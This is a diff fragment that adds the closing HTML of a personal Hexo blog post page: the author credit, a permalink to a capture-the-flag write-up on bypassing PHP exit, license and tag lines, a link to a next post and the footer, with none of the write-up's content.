+                        <span>Bantian</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="https://bantttian.github.io/2020/08/12/[WMCTF2020]Web_Checkin2-PHP%E7%BB%95%E8%BF%87exit/">https://bantttian.github.io/2020/08/12/[WMCTF2020]Web_Checkin2-PHP%E7%BB%95%E8%BF%87exit/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>早睡早起身体好</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/Web/"># Web</a>
+                    
+                        <a href="/tags/CTF/"># CTF</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2020/08/09/VulnHub_infovore/">从VulnHub_infovore靶机学习lfi+phpinfo=>RCE</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© Bantian | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
